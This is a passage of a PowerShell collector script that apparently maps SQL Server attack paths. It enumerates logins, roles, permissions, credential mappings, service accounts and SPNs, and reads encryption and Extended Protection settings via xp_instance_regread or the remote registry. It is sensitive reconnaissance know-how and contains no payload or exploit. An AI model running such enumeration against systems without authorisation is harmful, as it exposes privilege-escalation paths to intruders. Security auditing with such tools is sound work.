                    continue  # Skip permissions not in our mapping list
                }
                
                # Skip if already added as an explicit permission
                $alreadyExists = $false
                foreach ($perm in $permsList) {
                    if ($perm.Permission -eq $permission) {
                        $alreadyExists = $true
                        break
                    }
                }
                
                if (-not $alreadyExists) {
                    # Create a permission object with Class, Permission, and State
                    # Fixed role permissions we care about are all server or database level
                    $classValue = if ($PrincipalLevel -eq "Server") { "100" } else { "0" }  # Use raw integer values (100=SERVER, 0=DATABASE)
                    
                    $permObject = [PSCustomObject]@{
                        ClassDesc = $classDesc
                        Class = $classValue
                        Permission = $permission
                        State = "GRANT"   # All fixed role permissions are granted
                        MajorID = "0"
                    }
                    
                    # Add to permissions list
                    $permsList += $permObject
                }
            }
        }
        
        # Always add Permissions property, even if empty
        $principal | Add-Member -MemberType NoteProperty -Name "Permissions" -Value $permsList
        
        # For database principals, get server login mapping
        if ($PrincipalLevel -eq "Database" -and $Connection) {
            try {
                $serverLoginQuery = @"
SELECT 
    sp.name AS ServerLoginName,
    sp.principal_id AS ServerPrincipalID
FROM 
    sys.server_principals sp
    JOIN sys.database_principals dp ON sp.sid = dp.sid
WHERE 
    dp.principal_id = $principalID
"@
                $serverLoginCommand = New-Object System.Data.SqlClient.SqlCommand($serverLoginQuery, $Connection)
                $serverLoginReader = $serverLoginCommand.ExecuteReader()
                
                if ($serverLoginReader.Read()) {
                    $serverLoginPrincipalID = $serverLoginReader["ServerPrincipalID"].ToString()
                    $serverLoginName = $serverLoginReader["ServerLoginName"].ToString()
                    
                    # Find the ObjectIdentifier for the server login
                    $serverLoginObjectId = "$serverLoginName@$ObjectIdentifierBase"
                    
                    $principal | Add-Member -MemberType NoteProperty -Name "ServerLogin" -Value ([PSCustomObject]@{
                        PrincipalID = $serverLoginPrincipalID
                        ObjectIdentifier = $serverLoginObjectId
                    })
                } else {
                    # Add empty ServerLogin if none exists
                    $principal | Add-Member -MemberType NoteProperty -Name "ServerLogin" -Value $null
                }
                
                $serverLoginReader.Close()
            }
            catch {
                # Add empty ServerLogin if error occurs
                $principal | Add-Member -MemberType NoteProperty -Name "ServerLogin" -Value $null
                Write-Verbose "Failed to get server login for $principalName in ${DatabaseName}: $($_.Exception.Message)"
            }
        }
        
        # Add resolved SID for domain/server accounts
        $sidValue = $row["SID"].ToString()
        $shouldResolveSid = $false
        
        # Determine whether we should try to resolve the SID based on principal type
        if ($PrincipalLevel -eq "Server") {
            $shouldResolveSid = ($row["Type"].ToString() -in @('U','G','S')) -and ($sidValue -ne "0x01") -and ($principalName -match '\\')
        } else {
            $shouldResolveSid = ($row["Type"].ToString() -in @('U','G','S','E','X')) -and ($sidValue -ne "0x01") -and ($sidValue -ne "")
        }
        
        if ($shouldResolveSid) {
            $convertedSid = ConvertTo-SecurityIdentifier -SidHex $sidValue
            $principal | Add-Member -MemberType NoteProperty -Name "SecurityIdentifier" -Value $convertedSid
        } else {
            # Add empty SecurityIdentifier for other principals
            $principal | Add-Member -MemberType NoteProperty -Name "SecurityIdentifier" -Value $null
        }

        # For all roles (server and database), add Members property
        if ($principalType -in @("SERVER_ROLE", "DATABASE_ROLE")) {
            $members = @()
            if ($MembersByRole.ContainsKey($principalID)) {
                # Get member principal IDs
                $memberPrincipalIds = $MembersByRole[$principalID]
                
                # Convert principal IDs to ObjectIdentifiers
                foreach ($memberPrincipalId in $memberPrincipalIds) {
                    if ($PrincipalObjectIds.ContainsKey($memberPrincipalId)) {
                        $members += $PrincipalObjectIds[$memberPrincipalId]
                    }
                }
            }
            
            if ($members.Count -gt 0) {
                $principal | Add-Member -MemberType NoteProperty -Name "Members" -Value $members
            }
        }        
        
        # Add the principal to the result array
        $principals += $principal
    }
    
    # Return both the principals array and the flag for domain principals with sysadmin
    return @{
        Principals = $principals
        DomainPrincipalsWithControlServer = $domainPrincipalsWithControlServer
        DomainPrincipalsWithImpersonateAnyLogin = $domainPrincipalsWithImpersonateAnyLogin
        DomainPrincipalsWithSecurityadmin = $domainPrincipalsWithSecurityadmin
        DomainPrincipalsWithSysadmin = $domainPrincipalsWithSysadmin
        DomainPrincipalHasSysadmin = $domainPrincipalHasSysadmin
    }
}

function Process-ServerInstance {
    param (
        [string]$ServerName,
        [int]$Port = 1433,
        [string]$InstanceName
    )

    # Get server SID for ObjectIdentifier
    $serverSid = (Resolve-DomainPrincipal $serverName).SID
    if (-not $serverSid) {
        Write-Warning "Unable to resolve SID for server $serverName, using hostname instead."
        $serverSid = $serverName
    }

    # Create the ObjectIdentifier by combining SID and port/instance
    $serverObjectIdentifier = "$serverSid`:$Port"
    $serverDisplayName = "$serverName`:$Port"
    if ($instanceName -and $instanceName -ne "MSSQLSERVER") {
        $serverObjectIdentifier = "$serverSid`:$instanceName"
        $serverDisplayName = "$serverName`:$instanceName"
    }

    # Define serverInfo object properties
    $serverInfo = [PSCustomObject]@{
        ObjectIdentifier = $serverObjectIdentifier
        Name = $serverDisplayName
        Credentials = @()
        Databases = @()
        DomainPrincipalsWithControlServer = @()
        DomainPrincipalsWithImpersonateAnyLogin = @()
        DomainPrincipalsWithSecurityadmin = @()
        DomainPrincipalsWithSysadmin = @()
        ExtendedProtection = $null
        ForceEncryption = $null
        Hostname = $serverName
        InstanceName = $instanceName
        IsAnyDomainPrincipalSysadmin = $null
        IsMixedModeAuthEnabled = $null
        LinkedServers = @()
        LocalGroupsWithLogins = @{}
        Port = $Port
        ProxyAccounts = @()
        ServerPrincipals = @()
        ServicePrincipalNames = @()
        ServiceAccounts = @()
        ServiceAccountSIDs = @()
        Version = $null
    }

    # Get server name
    $serverHostname = ($serverName -split '\.')[0]

    # Build the server string based on instance type
    if ($InstanceName -and $InstanceName -ne "MSSQLSERVER") {
        # Named instance - use ServerName\InstanceName format
        $serverString = "$ServerName\$InstanceName"
    } elseif ($Port -ne 1433) {
        # Non-default port - use ServerName,Port format
        $serverString = "$ServerName,$Port"
    } else {
        # Default instance on default port - just use ServerName
        $serverString = $ServerName
    }

    # Before authenticating to the DBMS, test EPA from an unauthenticated perspective
    # Work in progress

    # Create a connection to SQL Server
    $connectionString = "Server=${serverString};Database=master"

    if ($Credential) {
        $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
        # Make SecureString read-only as required by SqlCredential
        $readOnlyPassword = $Credential.Password.Copy()
        $readOnlyPassword.MakeReadOnly()
        $connection.Credential = New-Object System.Data.SqlClient.SqlCredential($Credential.UserName, $readOnlyPassword)
    } elseif ($UserID -and $SecurePassword) {
        $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
        $connection.Credential = New-Object System.Data.SqlClient.SqlCredential($UserID, $SecurePassword)
    } elseif ($UserID -and $Password) {
        $connectionString += ";User ID=$UserID;Password=$Password"
        $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
    } else {
        $connectionString += ";Integrated Security=True"
        $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
    }

    # Test the connection first
    try {
        $connection.Open()
        Write-Host "Successfully connected to $serverString"
    } catch {
        Write-Warning "Failed to connect to $($serverString): $($_.Exception.Message)"

        $serverHostname = ($serverName -split '\.')[0]

        try {
            Write-Host "Trying short name: $serverHostName"

            # Build the server string based on instance type
            if ($InstanceName -and $InstanceName -ne "MSSQLSERVER") {
                # Named instance - use ServerName\InstanceName format
                $serverString = "$serverHostname\$InstanceName"
            } elseif ($Port -ne 1433) {
                # Non-default port - use ServerName,Port format
                $serverString = "$serverHostname,$Port"
            } else {
                # Default instance on default port - just use ServerName
                $serverString = $serverHostname
            }

            # Create a connection to SQL Server
            $connectionString = "Server=${serverString};Database=master"

            if ($UserID -and $Password) {
                $connectionString += ";User ID=$UserID;Password=$Password"
            } else {
                $connectionString += ";Integrated Security=True"
            }
            $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
            $connection.Open()
            Write-Host "Successfully connected to $serverString"
        }
        catch {
            Write-Host "Failed to connect to $($serverString): $($_.Exception.Message)" -ForegroundColor Red
            $connectionFailed = $true
        }
    }

    if (-not $connectionFailed) {

        # Get the FQDN of the SQL Server (remote or local)
        $serverFQDN = ""
        try {
            # First try to get the FQDN from SQL Server itself
            $fqdnQuery = "SELECT DEFAULT_DOMAIN() AS Domain"
            $fqdnCommand = New-Object System.Data.SqlClient.SqlCommand($fqdnQuery, $connection)
            $defaultDomain = $fqdnCommand.ExecuteScalar()
            
            # Get just the hostname from the connection
            $hostnamePart = ($serverName -split '[,\\]')[0]
            
            # Try to resolve the FQDN
            try {
                $hostEntry = [System.Net.Dns]::GetHostEntry($hostnamePart)
                $serverFQDN = $hostEntry.HostName.ToLower()
            } catch {
                # If DNS resolution fails, try to construct it
                if ($defaultDomain -and $hostnamePart -notmatch '\.') {
                    $serverFQDN = "$hostnamePart.$defaultDomain".ToLower()
                } else {
                    $serverFQDN = $hostnamePart.ToLower()
                }
            }
        } catch {
            # Fall back to the server name from connection
            $serverFQDN = ($serverName -split '[,\\]')[0].ToLower()
        }
    
        # Verify we got a proper FQDN, if not try another method
        if ($serverFQDN -notmatch '\.') {
            try {
                # Try using SERVERPROPERTY
                $machineNameQuery = "SELECT CAST(SERVERPROPERTY('MachineName') AS VARCHAR(255)) + '.' + DEFAULT_DOMAIN() AS FQDN"
                $machineNameCommand = New-Object System.Data.SqlClient.SqlCommand($machineNameQuery, $connection)
                $fqdnResult = $machineNameCommand.ExecuteScalar()
                if ($fqdnResult -and $fqdnResult -match '\.') {
                    $serverFQDN = $fqdnResult.ToLower()
                }
            } catch {
                Write-Verbose "Could not determine FQDN from SQL Server"
            }
        }
    
        # Get SQL Server version information
        $versionQuery = "SELECT @@VERSION as Version"
        $versionCommand = New-Object System.Data.SqlClient.SqlCommand($versionQuery, $connection)
        $serverVersion = $versionCommand.ExecuteScalar()
        $serverInfo.Version = $serverVersion
    
        # Get SQL Server instance name
        $instanceNameQuery = @"
IF SERVERPROPERTY('InstanceName') IS NULL
SELECT 'MSSQLSERVER' AS InstanceName;
ELSE
SELECT CAST(SERVERPROPERTY('InstanceName') AS NVARCHAR(128)) AS InstanceName;
"@
        $instanceNameCommand = New-Object System.Data.SqlClient.SqlCommand($instanceNameQuery, $connection)
        $instanceName = $instanceNameCommand.ExecuteScalar()
        $serverInfo.InstanceName = $instanceName
    
        # Get authentication mode
        $authModeQuery = @"
SELECT 
CASE SERVERPROPERTY('IsIntegratedSecurityOnly')
    WHEN 1 THEN 0  -- Windows Authentication only
    WHEN 0 THEN 1  -- Mixed mode
END AS IsMixedModeAuthEnabled
"@
        $authModeCommand = New-Object System.Data.SqlClient.SqlCommand($authModeQuery, $connection)
        $isMixedModeEnabled = ($authModeCommand.ExecuteScalar() -eq 1)
        $serverInfo.IsMixedModeAuthEnabled = $isMixedModeEnabled
    
        # Merge data from Active Directory if available
        $storedServerInfo = $null
        if ($script:serversToProcess.ContainsKey($serverObjectIdentifier)) {
            $storedServerInfo = $script:serversToProcess[$serverObjectIdentifier]
        }
    
        # Create an object to store all results
        $serverInfo.ServicePrincipalNames = if ($storedServerInfo -and $storedServerInfo.ServicePrincipalNames) { $storedServerInfo.ServicePrincipalNames } else {
                @(
                    "MSSQLSvc/$serverName`:$port",
                    "MSSQLSvc/$($serverHostname)`:$port"
                )}
        $serverInfo.ServiceAccountSIDs = if ($storedServerInfo -and $storedServerInfo.ServiceAccountSIDs) { $storedServerInfo.ServiceAccountSIDs } else { @() }
    
        # Get encryption settings from MSSQL and fallback to remote registry
        if (-not $serverInfo.ExtendedProtection) {
            try {
                $forceEncryption = $null
                $extendedProtection = $null
                
                # Get the SQL instance information from SQL Server
                $instanceInfoQuery = @"
SELECT 
SERVERPROPERTY('InstanceName') AS InstanceName,
SERVERPROPERTY('ProductVersion') AS ProductVersion
"@
                $instanceInfoCommand = New-Object System.Data.SqlClient.SqlCommand($instanceInfoQuery, $connection)
                $instanceInfoReader = $instanceInfoCommand.ExecuteReader()
                
                $sqlInstanceName = "MSSQLSERVER" # Default instance
                $sqlVersion = ""
                
                if ($instanceInfoReader.Read()) {
                    # If instance name is not null, use it
                    if (!$instanceInfoReader.IsDBNull(0)) {
                        $sqlInstanceName = $instanceInfoReader["InstanceName"]
                    }
                    
                    # Get SQL version to determine registry path component
                    if (!$instanceInfoReader.IsDBNull(1)) {
                        $sqlVersion = $instanceInfoReader["ProductVersion"]
                        # Extract major version for registry path (e.g., "16" from "16.0.1000.6")
                        $sqlMajorVersion = ($sqlVersion -split '\.')[0]
                    }
                }
                $instanceInfoReader.Close()
                
                # Determine SQL registry version component
                $sqlRegComponent = "MSSQL"
                if ($sqlMajorVersion) {
                    $sqlRegComponent = "MSSQL$sqlMajorVersion"
                }
                
                # Build registry path (handle both default and named instances)
                $regPath = "SOFTWARE\Microsoft\Microsoft SQL Server\$sqlRegComponent.$sqlInstanceName\MSSQLServer\SuperSocketNetLib"
                Write-Host "Collecting EPA settings from $regPath via MSSQL"
                
                # Try SQL-based method first
                try {
                    $epaQuery = @"
DECLARE @ForceEncryption INT
DECLARE @ExtendedProtection INT

-- For xp_instance_regread, use the instance-aware subkey path
-- It automatically prepends the SQL Server instance path
EXEC master.dbo.xp_instance_regread 
N'HKEY_LOCAL_MACHINE',
N'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\SuperSocketNetLib',
N'ForceEncryption',
@ForceEncryption OUTPUT

EXEC master.dbo.xp_instance_regread 
N'HKEY_LOCAL_MACHINE',
N'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\SuperSocketNetLib',
N'ExtendedProtection',
@ExtendedProtection OUTPUT

SELECT 
@ForceEncryption AS ForceEncryption,
@ExtendedProtection AS ExtendedProtection
"@
                    $epaCommand = New-Object System.Data.SqlClient.SqlCommand($epaQuery, $connection)
                    $reader = $epaCommand.ExecuteReader()
                    
                    if ($reader.Read()) {
                        # Check ForceEncryption
                        if (!$reader.IsDBNull(0)) {
                            $forceSetting = $reader["ForceEncryption"]
                            if ($forceSetting -eq 1) {
                                $forceEncryption = "Yes"
                            } else {
                                $forceEncryption = "No"
                            }
                        } else {
                            $forceEncryption = "Not Found"
                        }
                        
                        # Check ExtendedProtection
                        if (!$reader.IsDBNull(1)) {
                            $epSetting = $reader["ExtendedProtection"]
                            if ($epSetting -eq 1) {
                                $extendedProtection = "Allowed"
                            }
                            elseif ($epSetting -eq 2) {
                                $extendedProtection = "Required"
                            }
                            else {
                                $extendedProtection = "Off"
                            }
                        } else {
                            $extendedProtection = "Not Found"
                        }
                    }
                    $reader.Close()
                    
                    Write-Host "EPA settings collected via SQL: `n    ForceEncryption=$forceEncryption`n    ExtendedProtection=$extendedProtection"
                }
                catch {
                    Write-Host "SQL-based EPA collection failed: $_"
        
                    # Try Remote Registy
                    try {
                        Write-Host "Collecting EPA settings from $regPath via Remote Registry"
                        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $serverHostname)
                        $regKey = $reg.OpenSubKey($regPath)
                        
                        if ($regKey) {
                            # Check ForceEncryption
                            $forceSetting = $regKey.GetValue("ForceEncryption")
                            if ($forceSetting -eq 1) {
                                $forceEncryption = "Yes"
                            } else {
                                $forceEncryption = "No"
                            }
                            
                            # Check ExtendedProtection
                            $epSetting = $regKey.GetValue("ExtendedProtection")
                            if ($epSetting -eq 1) {
                                $extendedProtection = "Allowed"
                            }
                            elseif ($epSetting -eq 2) {
                                $extendedProtection = "Required"
                            }
                            else {
                                $extendedProtection = "Off"
                            }
                            
                            $regKey.Close()
                        }
                        
                        $reg.Close()
                    }
                    catch {
                        Write-Host "Error accessing registry: $($_.Exception.Message)"
                    }
                }
                
                # Add encryption settings to server info
                $serverInfo.ForceEncryption = $forceEncryption
                $serverInfo.ExtendedProtection = $extendedProtection
            }
            catch {
                Write-Host "Error determining encryption settings: $($_.Exception.Message)"
            }
        }
    
        # Collecting service account settings - try SQL first, then WMI
        Write-Host "Collecting service account information from $serverName"
            
        $serviceAccount = ""
        $serviceAccounts = @()
    
        # First try SQL-based methods
        try {
            # Check if sys.dm_server_services exists (SQL Server 2008 R2+)
            $checkDMVQuery = "SELECT OBJECT_ID('sys.dm_server_services')"
            $checkDMVCommand = New-Object System.Data.SqlClient.SqlCommand($checkDMVQuery, $connection)
            $dmvExists = $checkDMVCommand.ExecuteScalar()
            
            if ($dmvExists -ne [DBNull]::Value) {
                # Use sys.dm_server_services
                $serviceAccountQuery = @"
SELECT 
service_account AS ServiceAccount
FROM sys.dm_server_services
WHERE servicename LIKE 'SQL Server%' AND servicename NOT LIKE 'SQL Server Agent%'
"@    
                $serviceAccountCommand = New-Object System.Data.SqlClient.SqlCommand($serviceAccountQuery, $connection)
                $serviceAccount = $serviceAccountCommand.ExecuteScalar()
            }
            
            # If sys.dm_server_services doesn't exist or didn't return a result, use xp_instance_regread
            if ([string]::IsNullOrEmpty($serviceAccount)) {
                Write-Host "Could not get service account from sys.dm_server_services, trying xp_instance_regread"
                try {
                    $regReadQuery = @"
DECLARE @ServiceAccount NVARCHAR(256)
EXEC master.dbo.xp_instance_regread 
N'HKEY_LOCAL_MACHINE',
N'SYSTEM\CurrentControlSet\Services\MSSQLSERVER',
N'ObjectName',
@ServiceAccount OUTPUT
SELECT @ServiceAccount AS ServiceAccount
"@
                    $regReadCommand = New-Object System.Data.SqlClient.SqlCommand($regReadQuery, $connection)
                    $serviceAccount = $regReadCommand.ExecuteScalar()
                    
                    if ([string]::IsNullOrEmpty($serviceAccount)) {
                        # Try alternative registry path for named instances
                        $regReadQuery2 = @"
DECLARE @ServiceAccount NVARCHAR(256)
EXEC master.dbo.xp_instance_regread 
N'HKEY_LOCAL_MACHINE',
N'SYSTEM\CurrentControlSet\Services\MSSQL`$' + CAST(SERVERPROPERTY('InstanceName') AS NVARCHAR),
N'ObjectName',
@ServiceAccount OUTPUT
SELECT @ServiceAccount AS ServiceAccount
"@
                        $regReadCommand2 = New-Object System.Data.SqlClient.SqlCommand($regReadQuery2, $connection)
                        $serviceAccount = $regReadCommand2.ExecuteScalar()
                    }
                }
                catch {
                    Write-Verbose "xp_instance_regread failed: $_"
                    # Final SQL fallback - just get the current execution context
                    $contextQuery = "SELECT SYSTEM_USER AS ServiceAccount"
                    $contextCommand = New-Object System.Data.SqlClient.SqlCommand($contextQuery, $connection)
                    $serviceAccount = $contextCommand.ExecuteScalar()
                }
            } else {
                Write-Host "Identified service account in sys.dm_server_services"
            }
            
            # If we got a service account through SQL, try to resolve it
            if (-not [string]::IsNullOrEmpty($serviceAccount)) {
                Write-Host "SQL Server service account: $serviceAccount"
                
                # If service account is LocalSystem or NetworkService, get computer account
                if ($serviceAccount -eq "LocalSystem" -or 
                $serviceAccount -eq "NT AUTHORITY\NETWORKSERVICE" -or 
                $serviceAccount -eq "NT AUTHORITY\NETWORK SERVICE" -or 
                $serviceAccount -eq "NT AUTHORITY\LOCALSERVICE" -or
                $serviceAccount -eq "NT AUTHORITY\LOCAL SERVICE") {
    
                    # Get computer name with $ suffix (SAMACCOUNTNAME format)
                    $computerName = [System.Net.Dns]::GetHostEntry($serverName.Split('\')[0]).HostName.Split('.')[0]
                    $serviceAccount = "$computerName$"
                    Write-Host "Adding service account: $serviceAccount"
                }

                $serviceAccount = Resolve-DomainPrincipal $serviceAccount
    
                if ($serviceAccount -and -not $serviceAccount.Error) {
                    $serviceAccounts += $serviceAccount
                }
            }
        }
        catch {
            Write-Warning "SQL-based service account detection failed: $_"
        }
    
        # If SQL methods failed, fall back to WMI
        if ([string]::IsNullOrEmpty($serviceAccount)) {
            Write-Host "Falling back to WMI for service account detection"
    
            try {
                # Get service information from WMI
                $sqlServiceInfo = Get-CimInstance -Class Win32_Service -ComputerName $serverHostname | 
                Where-Object { $_.DisplayName -like 'SQL Server (*)' } |
                Select-Object Name, DisplayName, StartName, State
                
                # If service account is LocalSystem or NetworkService, get computer account
                if ($sqlServiceInfo.StartName -eq "LocalSystem" -or 
                $sqlServiceInfo.StartName -eq "NT AUTHORITY\NETWORKSERVICE" -or 
                $sqlServiceInfo.StartName -eq "NT AUTHORITY\NETWORK SERVICE" -or
                $sqlServiceInfo.StartName -eq "NT AUTHORITY\LOCALSERVICE" -or 
                $sqlServiceInfo.StartName -eq "NT AUTHORITY\LOCAL SERVICE") {
    
                    # Get computer name with $ suffix (SAMACCOUNTNAME format)
                    $computerName = [System.Net.Dns]::GetHostEntry($serverName.Split('\')[0]).HostName.Split('.')[0]
                    $serviceAccount = "$computerName$"
                    Write-Host "Adding service account: $serviceAccount"
                } 
                $serviceAccount = Resolve-DomainPrincipal $serviceAccount
    
                if ($serviceAccount -and -not $serviceAccount.Error) {
                    $serviceAccounts += $serviceAccount
                }
            }
            catch {
                Write-Warning "WMI service account detection also failed: $_"
                Write-Warning "Unable to determine SQL Server service account"
            }
        }
        
        $serverInfo.ServiceAccounts = $serviceAccounts
    
        Write-Host "Enumerating server principals..."
    
        # Get all server principals - build query dynamically based on SQL Server version
        # is_fixed_role and owning_principal_id not present in SQL Server 2005
        $columnCheckQuery = @"
SELECT 
CASE WHEN COL_LENGTH('sys.server_principals', 'is_fixed_role') IS NOT NULL THEN 1 ELSE 0 END AS HasIsFixedRole,
CASE WHEN COL_LENGTH('sys.server_principals', 'owning_principal_id') IS NOT NULL THEN 1 ELSE 0 END AS HasOwningPrincipalId
"@
        $columnCheckCommand = New-Object System.Data.SqlClient.SqlCommand($columnCheckQuery, $connection)
        $reader = $columnCheckCommand.ExecuteReader()
        $hasIsFixedRole = $false
        $hasOwningPrincipalId = $false
        
        if ($reader.Read()) {
            $hasIsFixedRole = $reader["HasIsFixedRole"] -eq 1
            $hasOwningPrincipalId = $reader["HasOwningPrincipalId"] -eq 1
        }
        $reader.Close()
        
        # Build the appropriate query based on available columns
        if ($hasIsFixedRole -and $hasOwningPrincipalId) {
            # SQL Server 2008+ with all columns
            $principalsQuery = @"
SELECT 
CONVERT(VARCHAR, create_date, 120) AS CreateDate,
default_database_name AS DefaultDatabaseName,
CASE 
WHEN name LIKE '%\%' AND 
    name NOT LIKE 'NT SERVICE\%' AND
    name NOT LIKE 'NT AUTHORITY\%' AND
    name NOT LIKE CAST(SERVERPROPERTY('MachineName') AS nvarchar) + '\%' AND
    name NOT LIKE 'BUILTIN\%'
THEN '1' ELSE '0' END AS IsActiveDirectoryPrincipal,
CASE WHEN is_disabled = 1 THEN '1' ELSE '0' END AS IsDisabled,
CASE WHEN is_fixed_role = 1 THEN '1' ELSE '0' END AS IsFixedRole,
CONVERT(VARCHAR, modify_date, 120) AS ModifyDate,
name AS Name,
ISNULL(CONVERT(VARCHAR, owning_principal_id), '') AS OwningPrincipalID,
CONVERT(VARCHAR, principal_id) AS PrincipalID,
'0x' + CONVERT(VARCHAR(MAX), sid, 2) AS SID,
type AS Type,
type_desc AS TypeDescription
FROM sys.server_principals
ORDER BY principal_id
"@
        } else {
            # SQL Server 2005 compatibility
            $principalsQuery = @"
SELECT 
CONVERT(VARCHAR, create_date, 120) AS CreateDate,
default_database_name AS DefaultDatabaseName,
CASE 
WHEN name LIKE '%\%' AND 
    name NOT LIKE 'NT SERVICE\%' AND
    name NOT LIKE 'NT AUTHORITY\%' AND
    name NOT LIKE CAST(SERVERPROPERTY('MachineName') AS nvarchar) + '\%' AND
    name NOT LIKE 'BUILTIN\%'
THEN '1' ELSE '0' END AS IsActiveDirectoryPrincipal,
CASE WHEN is_disabled = 1 THEN '1' ELSE '0' END AS IsDisabled,
CASE WHEN type = 'R' AND name IN ('sysadmin', 'securityadmin', 'serveradmin', 'setupadmin', 'processadmin', 'diskadmin', 'dbcreator', 'bulkadmin', 'public') THEN '1' ELSE '0' END AS IsFixedRole,
CONVERT(VARCHAR, modify_date, 120) AS ModifyDate,
name AS Name,
'' AS OwningPrincipalID,
CONVERT(VARCHAR, principal_id) AS PrincipalID,
'0x' + CONVERT(VARCHAR(MAX), sid, 2) AS SID,
type AS Type,
type_desc AS TypeDescription
FROM sys.server_principals
ORDER BY principal_id
"@
        }
        $principalsCommand = New-Object System.Data.SqlClient.SqlCommand($principalsQuery, $connection)
        $principalsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($principalsCommand)
        $principalsTable = New-Object System.Data.DataSet
        $principalsAdapter.Fill($principalsTable) | Out-Null
    
        # Get credential mappings for server principals
        # Check if sys.server_principal_credentials exists (SQL Server 2012+)
        $checkCredMappingsQuery = "SELECT OBJECT_ID('sys.server_principal_credentials')"
        $checkCredMappingsCommand = New-Object System.Data.SqlClient.SqlCommand($checkCredMappingsQuery, $connection)
        $credMappingsExists = $checkCredMappingsCommand.ExecuteScalar()
        
        if ($credMappingsExists -ne [DBNull]::Value) {
            
            # Get credential mappings for server principals
            $credentialMappingsQuery = @"
SELECT 
spc.principal_id,
sp.name AS principal_name,
c.credential_id,
c.name AS credential_name,
c.credential_identity
FROM sys.server_principal_credentials spc
INNER JOIN sys.server_principals sp ON spc.principal_id = sp.principal_id
INNER JOIN sys.credentials c ON spc.credential_id = c.credential_id
"@
            $credentialMappingsCommand = New-Object System.Data.SqlClient.SqlCommand($credentialMappingsQuery, $connection)
            $credentialMappingsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($credentialMappingsCommand)
            $credentialMappingsTable = New-Object System.Data.DataSet
            $credentialMappingsAdapter.Fill($credentialMappingsTable) | Out-Null
            
            # Create lookup for credential mappings
            $principalCredentialMap = @{}
            foreach ($row in $credentialMappingsTable.Tables[0].Rows) {
                $principalId = $row["principal_id"].ToString()
                $principalCredentialMap[$principalId] = [PSCustomObject]@{
                    CredentialId = $row["credential_id"]
                    CredentialName = $row["credential_name"]
                    CredentialIdentity = $row["credential_identity"]
                }
            }
        } else {
            Write-Verbose "sys.server_principal_credentials not available (SQL Server 2005/2008). Skipping credential mappings."
            $principalCredentialMap = @{}
        }
    
        # Get all direct server role memberships at once (optimized approach)
        $allServerRoleMembershipsQuery = @"
SELECT 
m.principal_id AS MemberPrincipalID,
r.principal_id AS RolePrincipalID,
r.name AS RoleName
FROM sys.server_role_members rm
JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
ORDER BY m.principal_id, r.name
"@
        $allServerRoleMembershipsCommand = New-Object System.Data.SqlClient.SqlCommand($allServerRoleMembershipsQuery, $connection)
        $allServerRoleMembershipsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($allServerRoleMembershipsCommand)
        $allServerRoleMembershipsTable = New-Object System.Data.DataSet
        $allServerRoleMembershipsAdapter.Fill($allServerRoleMembershipsTable) | Out-Null
    
        # Create a hashtable for quick lookup of server role memberships by principal ID
        $serverMembershipsByPrincipal = @{}
        foreach ($row in $allServerRoleMembershipsTable.Tables[0].Rows) {
            $memberPrincipalID = $row["MemberPrincipalID"].ToString()
            
            if (-not $serverMembershipsByPrincipal.ContainsKey($memberPrincipalID)) {
                $serverMembershipsByPrincipal[$memberPrincipalID] = @()
            }
            
            # Create the ObjectIdentifier for the role
            $roleName = $row["RoleName"].ToString()
            $roleObjectId = "$roleName@$serverObjectIdentifier"
            
            $serverMembershipsByPrincipal[$memberPrincipalID] += [PSCustomObject]@{
                PrincipalID = $row["RolePrincipalID"].ToString()
                ObjectIdentifier = $roleObjectId
            }
        }
    
        # Create reverse lookup - which principals are members of each role
        $serverMembersByRole = @{}
        foreach ($row in $allServerRoleMembershipsTable.Tables[0].Rows) {
            $rolePrincipalID = $row["RolePrincipalID"].ToString()
            $memberPrincipalID = $row["MemberPrincipalID"].ToString()
            
            if (-not $serverMembersByRole.ContainsKey($rolePrincipalID)) {
                $serverMembersByRole[$rolePrincipalID] = @()
            }
            
            $serverMembersByRole[$rolePrincipalID] += $memberPrincipalID
        }  
    
        # Get explicit server permissions for all principals
        $explicitPermissionsQuery = @"
SELECT 
sp.name AS PrincipalName,
sp.principal_id AS PrincipalID,
sp.type_desc AS PrincipalType,
p.permission_name AS PermissionName,
p.state_desc AS StateDesc,
p.class AS ClassValue,
CASE p.class
    WHEN 100 THEN 'SERVER'
    WHEN 101 THEN 'SERVER_PRINCIPAL'
    WHEN 105 THEN 'ENDPOINT'
    ELSE 'UNKNOWN'
END AS ClassDesc,
CAST(p.major_id AS VARCHAR) AS MajorID
FROM sys.server_permissions p
JOIN sys.server_principals sp ON p.grantee_principal_id = sp.principal_id
ORDER BY sp.name, p.permission_name
"@
        $explicitPermissionsCommand = New-Object System.Data.SqlClient.SqlCommand($explicitPermissionsQuery, $connection)
        $explicitPermissionsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($explicitPermissionsCommand)
        $explicitPermissionsTable = New-Object System.Data.DataSet
        $explicitPermissionsAdapter.Fill($explicitPermissionsTable) | Out-Null
    
        $explicitServerPermissions = @{}
        foreach ($row in $explicitPermissionsTable.Tables[0].Rows) {
            $principalID = if (-not [System.DBNull]::Value.Equals($row["PrincipalID"])) { $row["PrincipalID"].ToString() } else { "" }
            $permission = if (-not [System.DBNull]::Value.Equals($row["PermissionName"])) { $row["PermissionName"].ToString() } else { "" }
            $classValue = if (-not [System.DBNull]::Value.Equals($row["ClassValue"])) { $row["ClassValue"].ToString() } else { "" }
            $classDesc = if (-not [System.DBNull]::Value.Equals($row["ClassDesc"])) { $row["ClassDesc"].ToString() } else { "" }
            $stateDesc = if (-not [System.DBNull]::Value.Equals($row["StateDesc"])) { $row["StateDesc"].ToString() } else { "" }
            $majorID = if (-not [System.DBNull]::Value.Equals($row["MajorID"])) { $row["MajorID"].ToString() } else { "0" }
            
            if (-not $explicitServerPermissions.ContainsKey($principalID)) {
                $explicitServerPermissions[$principalID] = @{}
            }
    
            # Create a unique key for the permission that includes the target
            # This prevents overwriting when same permission exists on different targets (e.g., principal has ALTER permission on multiple targets)
            $permKey = if ($classValue -eq "101" -and $majorID -ne "0") {
